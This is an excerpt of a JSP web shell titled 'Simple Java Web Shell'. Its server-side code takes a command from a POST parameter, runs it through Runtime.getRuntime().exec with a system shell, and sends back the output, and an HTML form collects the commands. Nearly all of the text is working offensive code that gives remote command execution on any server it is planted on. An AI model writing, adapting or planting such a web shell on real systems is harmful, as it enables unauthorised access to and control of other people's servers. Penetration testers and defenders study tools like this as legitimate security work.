...
<%
    ...
    if (request.getMethod() == "POST" && request.getParameter(parameter) != null && request.getParameter(parameter).trim().length() > 0) {
        ...
        if (shell != null) {
            ...
            try {
                process = Runtime.getRuntime().exec(shell + " \"(" + request.getParameter(parameter).trim() + ") 2>&1\"");
...
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Simple Java Web Shell</title>
        <meta name="author" content="Ivan Šincek">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
        <form method="post" action="./simple_jsp_web_shell_post.jsp">
            <input name="<% out.print(parameter); %>" type="text" placeholder="Enter Command" autofocus="autofocus">
        </form>
